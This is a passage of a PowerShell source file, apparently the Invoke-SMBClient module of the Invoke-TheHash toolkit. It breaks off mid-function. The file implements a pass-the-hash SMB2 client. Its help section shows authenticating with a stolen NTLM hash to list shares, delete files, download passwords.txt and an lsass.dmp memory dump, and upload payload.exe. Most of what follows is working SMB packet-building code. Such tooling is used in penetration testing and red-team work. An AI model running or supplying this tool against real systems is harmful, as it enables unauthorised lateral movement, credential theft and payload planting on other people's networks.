function Invoke-SMBClient
{
<#
.SYNOPSIS
Invoke-SMBClient performs basic file share tasks with pass the hash. This module supports SMB2 (2.1) only with and
without SMB signing. Note that this client is slow compared to the Windows client.

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the
username. 

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.Parameter Action
Default = List: (List/Recurse/Delete/Get/Put) Action to perform. 
List: Lists the contents of a directory.
Recurse: Lists the contents of a directory and all subdirectories.
Delete: Deletes a file.
Get: Downloads a file.
Put: Uploads a file and sets the creation, access, and last write times to match the source file.

.PARAMETER Source
List and Recurse: UNC path to a directory.
Delete: UNC path to a file.
Get: UNC path to a file.
Put: File to upload. If a full path is not specified, the file must be in the current directory. When using the
'Modify' switch, 'Source' must be a byte array.

.PARAMETER Destination
List and Recurse: Not used.
Delete: Not used.
Get: If used, value will be the new filename of downloaded file. If a full path is not specified, the file will be
created in the current directory.
Put: UNC path for uploaded file. The filename must be specified.

.PARAMETER Modify
List and Recurse: The function will output an object consisting of directory contents.
Delete: Not used.
Get: The function will output a byte array of the downloaded file instead of writing the file to disk. It's
advisable to use this only with smaller files and to send the output to a variable.
Put: Uploads a byte array to a new destination file.

.PARAMETER NoProgress
List and Recurse: Not used.
Delete: Not used.
Get and Put: Prevents displaying of a progress bar.

.PARAMETER Sleep
Default = 100 Milliseconds: Sets the function's Start-Sleep values in milliseconds. You can try increasing this
if downloaded files are being corrupted.

.PARAMETER Session
Inveigh-Relay authenticated session.

.EXAMPLE
List the contents of a root share directory.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Source \\server\share -verbose

.EXAMPLE
Recursively list the contents of a share starting at the root.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Recurse -Source \\server\share

.EXAMPLE
Recursively list the contents of a share subdirectory and return only the contents output to a variable.
$directory_contents = Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Recurse -Source \\server\share\subdirectory -Modify

.EXAMPLE
Delete a file on a share.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Delete -Source \\server\share\payload.exe

.EXAMPLE
Delete a file in subdirectories within a share.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Delete -Source \\server\share\subdirectory\subdirectory\payload.exe

.EXAMPLE
Download a file from a share.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Get -Source \\server\share\passwords.txt

.EXAMPLE
Download a file from within a share subdirectory and set a new filename.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Get -Source \\server\share\subdirectory\lsass.dmp -Destination server_lsass.dmp

.EXAMPLE
Download a file from a share to a byte array variable instead of disk.
[Byte[]]$password_file = Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Get -Source \\server\share\passwords.txt -Modify
[System.Text.Encoding]::UTF8.GetString($password_file)

.EXAMPLE
Upload a file to a share subdirectory.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Put -Source payload.exe -Destination \\server\share\subdirectory\payload.exe

.EXAMPLE
Upload a file to share from a byte array variable.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Put -Source $file_byte_array -Destination \\server\share\file.docx -Modify

.EXAMPLE
List the contents of a share directory using an authenticated Inveigh-Relay session.
Invoke-SMBClient -Session 1 -Source \\server\share

.LINK
https://github.com/Kevin-Robertson/Invoke-TheHash

#>
[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(Mandatory=$false)][ValidateSet("List","Recurse","Get","Put","Delete")][String]$Action = "List",
    [parameter(Mandatory=$false)][String]$Destination,
    [parameter(ParameterSetName='Default',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Default',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$true)][Object]$Source,
    [parameter(ParameterSetName='Default',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][Switch]$Modify,
    [parameter(Mandatory=$false)][Switch]$NoProgress,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Int]$Session,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Logoff,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Refresh,
    [parameter(Mandatory=$false)][Int]$Sleep=100
)

function ConvertFrom-PacketOrderedDictionary
{
    param($ordered_dictionary)

    ForEach($field in $ordered_dictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#NetBIOS

function New-PacketNetBIOSSessionService
{
    param([Int]$HeaderLength,[Int]$DataLength)

    [Byte[]]$length = ([System.BitConverter]::GetBytes($HeaderLength + $DataLength))[2..0]

    $NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
    $NetBIOSSessionService.Add("MessageType",[Byte[]](0x00))
    $NetBIOSSessionService.Add("Length",$length)

    return $NetBIOSSessionService
}

#SMB1

function New-PacketSMBHeader
{
    param([Byte[]]$Command,[Byte[]]$Flags,[Byte[]]$Flags2,[Byte[]]$TreeID,[Byte[]]$ProcessID,[Byte[]]$UserID)

    $ProcessID = $ProcessID[0,1]

    $SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
    $SMBHeader.Add("Command",$Command)
    $SMBHeader.Add("ErrorClass",[Byte[]](0x00))
    $SMBHeader.Add("Reserved",[Byte[]](0x00))
    $SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Flags",$Flags)
    $SMBHeader.Add("Flags2",$Flags2)
    $SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMBHeader.Add("TreeID",$TreeID)
    $SMBHeader.Add("ProcessID",$ProcessID)
    $SMBHeader.Add("UserID",$UserID)
    $SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))

    return $SMBHeader
}

function New-PacketSMBNegotiateProtocolRequest
{
    param([String]$Version)

    if($version -eq 'SMB1')
    {
        [Byte[]]$byte_count = 0x0c,0x00
    }
    else
    {
        [Byte[]]$byte_count = 0x22,0x00  
    }

    $SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))
    $SMBNegotiateProtocolRequest.Add("ByteCount",$byte_count)
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($version -ne 'SMB1')
    {
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }

    return $SMBNegotiateProtocolRequest
}

#SMB2

function New-PacketSMB2Header
{
    param([Byte[]]$Command,[Byte[]]$CreditRequest,[Bool]$Signing,[Int]$MessageID,[Byte[]]$ProcessID,[Byte[]]$TreeID,[Byte[]]$SessionID)

    if($Signing)
    {
        $flags = 0x08,0x00,0x00,0x00      
    }
    else
    {
        $flags = 0x00,0x00,0x00,0x00
    }

    [Byte[]]$message_ID = [System.BitConverter]::GetBytes($MessageID)

    if($message_ID.Length -eq 4)
    {
        $message_ID += 0x00,0x00,0x00,0x00
    }

    $SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
    $SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))
    $SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))
    $SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Command",$Command)
    $SMB2Header.Add("CreditRequest",$CreditRequest)
    $SMB2Header.Add("Flags",$flags)
    $SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2Header.Add("MessageID",$message_ID)
    $SMB2Header.Add("ProcessID",$ProcessID)
    $SMB2Header.Add("TreeID",$TreeID)
    $SMB2Header.Add("SessionID",$SessionID)
    $SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $SMB2Header
}

function New-PacketSMB2NegotiateProtocolRequest
{
    $SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))
    $SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))
    $SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))
    $SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))

    return $SMB2NegotiateProtocolRequest
}

function New-PacketSMB2SessionSetupRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$security_buffer_length = ([System.BitConverter]::GetBytes($SecurityBlob.Length))[0,1]

    $SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))
    $SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))
    $SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))
    $SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferLength",$security_buffer_length)
    $SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Buffer",$SecurityBlob)

    return $SMB2SessionSetupRequest 
}

function New-PacketSMB2TreeConnectRequest
{
    param([Byte[]]$Buffer)

    [Byte[]]$path_length = ([System.BitConverter]::GetBytes($Buffer.Length))[0,1]

    $SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeConnectRequest.Add("StructureSize",[Byte[]](0x09,0x00))
    $SMB2TreeConnectRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2TreeConnectRequest.Add("PathOffset",[Byte[]](0x48,0x00))
    $SMB2TreeConnectRequest.Add("PathLength",$path_length)
    $SMB2TreeConnectRequest.Add("Buffer",$Buffer)

    return $SMB2TreeConnectRequest
}

function New-PacketSMB2CreateRequest
{
    param([Byte[]]$FileName,[Int]$ExtraInfo,[Int64]$AllocationSize)

    if($FileName)
    {
        $file_name_length = [System.BitConverter]::GetBytes($FileName.Length)
        $file_name_length = $file_name_length[0,1]
    }
    else
    {
        $FileName = 0x00,0x00,0x69,0x00,0x6e,0x00,0x64,0x00
        $file_name_length = 0x00,0x00
    }

    if($ExtraInfo)
    {
        [Byte[]]$desired_access = 0x80,0x00,0x10,0x00
        [Byte[]]$file_attributes = 0x00,0x00,0x00,0x00
        [Byte[]]$share_access = 0x00,0x00,0x00,0x00
        [Byte[]]$create_options = 0x21,0x00,0x00,0x00
        [Byte[]]$create_contexts_offset = [System.BitConverter]::GetBytes($FileName.Length)

        if($ExtraInfo -eq 1)
        {
            [Byte[]]$create_contexts_length = 0x58,0x00,0x00,0x00
        }
        elseif($ExtraInfo -eq 2)
        {
            [Byte[]]$create_contexts_length = 0x90,0x00,0x00,0x00
        }
        else
        {
            [Byte[]]$create_contexts_length = 0xb0,0x00,0x00,0x00
            [Byte[]]$allocation_size_bytes = [System.BitConverter]::GetBytes($AllocationSize)
        }

        if($FileName)
        {

            [String]$file_name_padding_check = $FileName.Length / 8

            if($file_name_padding_check -like "*.75")
            {
                $FileName += 0x04,0x00
            }
            elseif($file_name_padding_check -like "*.5")
            {
                $FileName += 0x00,0x00,0x00,0x00
            }
            elseif($file_name_padding_check -like "*.25")
            {
               $FileName += 0x00,0x00,0x00,0x00,0x00,0x00
            }

        }

        [Byte[]]$create_contexts_offset = [System.BitConverter]::GetBytes($FileName.Length + 120)

    }
    else
    {
        [Byte[]]$desired_access = 0x03,0x00,0x00,0x00
        [Byte[]]$file_attributes = 0x80,0x00,0x00,0x00
        [Byte[]]$share_access = 0x01,0x00,0x00,0x00
        [Byte[]]$create_options = 0x40,0x00,0x00,0x00
        [Byte[]]$create_contexts_offset = 0x00,0x00,0x00,0x00
        [Byte[]]$create_contexts_length = 0x00,0x00,0x00,0x00
    }

    $SMB2CreateRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CreateRequest.Add("StructureSize",[Byte[]](0x39,0x00))
    $SMB2CreateRequest.Add("Flags",[Byte[]](0x00))
    $SMB2CreateRequest.Add("RequestedOplockLevel",[Byte[]](0x00))
    $SMB2CreateRequest.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $SMB2CreateRequest.Add("SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequest.Add("DesiredAccess",$desired_access)
    $SMB2CreateRequest.Add("FileAttributes",$file_attributes)
    $SMB2CreateRequest.Add("ShareAccess",$share_access)
    $SMB2CreateRequest.Add("CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2CreateRequest.Add("CreateOptions",$create_options)
    $SMB2CreateRequest.Add("NameOffset",[Byte[]](0x78,0x00))
    $SMB2CreateRequest.Add("NameLength",$file_name_length)
    $SMB2CreateRequest.Add("CreateContextsOffset",$create_contexts_offset)
    $SMB2CreateRequest.Add("CreateContextsLength",$create_contexts_length)
    $SMB2CreateRequest.Add("Buffer",$FileName)

    if($ExtraInfo)
    {
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_ChainOffset",[Byte[]](0x28,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Tag_Offset",[Byte[]](0x10,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Data_Offset",[Byte[]](0x18,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Data_Length",[Byte[]](0x10,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Tag",[Byte[]](0x44,0x48,0x6e,0x51))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Unknown",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Data_GUIDHandle",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        if($ExtraInfo -eq 3)
        {
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_ChainOffset",[Byte[]](0x20,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Tag_Offset",[Byte[]](0x10,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Data_Offset",[Byte[]](0x18,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Data_Length",[Byte[]](0x08,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Tag",[Byte[]](0x41,0x6c,0x53,0x69))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Unknown",[Byte[]](0x00,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_AllocationSize",$allocation_size_bytes)
        }

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_ChainOffset",[Byte[]](0x18,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Tag_Offset",[Byte[]](0x10,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Data_Offset",[Byte[]](0x18,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Data_Length",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Tag",[Byte[]](0x4d,0x78,0x41,0x63))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

        if($ExtraInfo -gt 1)
        {
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_ChainOffset",[Byte[]](0x18,0x00,0x00,0x00))
        }
        else
        {
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_ChainOffset",[Byte[]](0x00,0x00,0x00,0x00))
        }
        
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Tag_Offset",[Byte[]](0x10,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Data_Offset",[Byte[]](0x18,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Data_Length",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Tag",[Byte[]](0x51,0x46,0x69,0x64))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

        if($ExtraInfo -gt 1)
        {
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_ChainOffset",[Byte[]](0x00,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Tag_Offset",[Byte[]](0x10,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Offset",[Byte[]](0x18,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Length",[Byte[]](0x20,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Tag",[Byte[]](0x52,0x71,0x4c,0x73))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

            if($ExtraInfo -eq 2)
            {
                $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_Key",[Byte[]](0x10,0xb0,0x1d,0x02,0xa0,0xf8,0xff,0xff,0x47,0x78,0x67,0x02,0x00,0x00,0x00,0x00))
            }
            else
            {
                $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_Key",[Byte[]](0x10,0x90,0x64,0x01,0xa0,0xf8,0xff,0xff,0x47,0x78,0x67,0x02,0x00,0x00,0x00,0x00))
            }

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_State",[Byte[]](0x07,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_Flags",[Byte[]](0x00,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_Duration",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        }

    }

    return $SMB2CreateRequest
}

function New-PacketSMB2FindRequestFile
{
    param ([Byte[]]$FileID,[Byte[]]$Padding)

    $SMB2FindRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_StructureSize",[Byte[]](0x21,0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_InfoLevel",[Byte[]](0x25))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_Flags",[Byte[]](0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_FileIndex",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_FileID",$FileID)
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_SearchPattern_Offset",[Byte[]](0x60,0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_SearchPattern_Length",[Byte[]](0x02,0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_OutputBufferLength",[Byte[]](0x00,0x00,0x01,0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_SearchPattern",[Byte[]](0x2a,0x00))

    if($padding)
    {
        $SMB2FindRequestFile.Add("SMB2FindRequestFile_Padding",$Padding)
    }

    return $SMB2FindRequestFile
}

function New-PacketSMB2QueryInfoRequest
{
    param ([Byte[]]$InfoType,[Byte[]]$FileInfoClass,[Byte[]]$OutputBufferLength,[Byte[]]$InputBufferOffset,[Byte[]]$FileID,[Int]$Buffer)

    [Byte[]]$buffer_bytes = ,0x00 * $Buffer

    $SMB2QueryInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2QueryInfoRequest.Add("StructureSize",[Byte[]](0x29,0x00))
    $SMB2QueryInfoRequest.Add("InfoType",$InfoType)
    $SMB2QueryInfoRequest.Add("FileInfoClass",$FileInfoClass)
    $SMB2QueryInfoRequest.Add("OutputBufferLength",$OutputBufferLength)
    $SMB2QueryInfoRequest.Add("InputBufferOffset",$InputBufferOffset)
    $SMB2QueryInfoRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2QueryInfoRequest.Add("InputBufferLength",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2QueryInfoRequest.Add("AdditionalInformation",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2QueryInfoRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2QueryInfoRequest.Add("FileID",$FileID)

    if($Buffer -gt 0)
    {
        $SMB2QueryInfoRequest.Add("Buffer",$buffer_bytes)
    }

    return $SMB2QueryInfoRequest
}

function New-PacketSMB2ReadRequest
{
    param ([Byte[]]$FileID)

    $SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2ReadRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2ReadRequest.Add("Padding",[Byte[]](0x50))
    $SMB2ReadRequest.Add("Flags",[Byte[]](0x00))
    $SMB2ReadRequest.Add("Length",[Byte[]](0x00,0x00,0x10,0x00))
    $SMB2ReadRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("FileID",$FileID)
    $SMB2ReadRequest.Add("MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("Buffer",[Byte[]](0x30))

    return $SMB2ReadRequest
}

function New-PacketSMB2WriteRequest
{
    param([Byte[]]$FileID,[Int]$RPCLength)

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($RPCLength)

    $SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2WriteRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2WriteRequest.Add("DataOffset",[Byte[]](0x70,0x00))
    $SMB2WriteRequest.Add("Length",$write_length)
    $SMB2WriteRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("FileID",$FileID)
    $SMB2WriteRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))

    return $SMB2WriteRequest
}

function New-PacketSMB2CloseRequest
{
    param ([Byte[]]$FileID)

    $SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CloseRequest.Add("StructureSize",[Byte[]](0x18,0x00))
    $SMB2CloseRequest.Add("Flags",[Byte[]](0x00,0x00))
    $SMB2CloseRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CloseRequest.Add("FileID",$FileID)

    return $SMB2CloseRequest
}

function New-PacketSMB2TreeDisconnectRequest
{
    $SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeDisconnectRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2TreeDisconnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2TreeDisconnectRequest
}

function New-PacketSMB2SessionLogoffRequest
{
    $SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionLogoffRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2SessionLogoffRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2SessionLogoffRequest
}

function New-PacketSMB2IoctlRequest()
{
    param([Byte[]]$FileName)

    $file_name_length = [System.BitConverter]::GetBytes($FileName.Length + 2)

    $packet_SMB2IoctlRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2IoctlRequest.Add("StructureSize",[Byte[]](0x39,0x00))
    $packet_SMB2IoctlRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2IoctlRequest.Add("Function",[Byte[]](0x94,0x01,0x06,0x00))
    $packet_SMB2IoctlRequest.Add("GUIDHandle",[Byte[]](0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff))
    $packet_SMB2IoctlRequest.Add("InData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("InData_Length",$file_name_length)
    $packet_SMB2IoctlRequest.Add("MaxIoctlInSize",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("OutData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("OutData_Length",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("MaxIoctlOutSize",[Byte[]](0x00,0x10,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("Flags",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("Unknown",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("InData_MaxReferralLevel",[Byte[]](0x04,0x00))
    $packet_SMB2IoctlRequest.Add("InData_FileName",$FileName)

    return $packet_SMB2IoctlRequest
}

function New-PacketSMB2SetInfoRequest
{
    param ([Byte[]]$InfoType,[Byte[]]$FileInfoClass,[Byte[]]$FileID,[Byte[]]$Buffer)

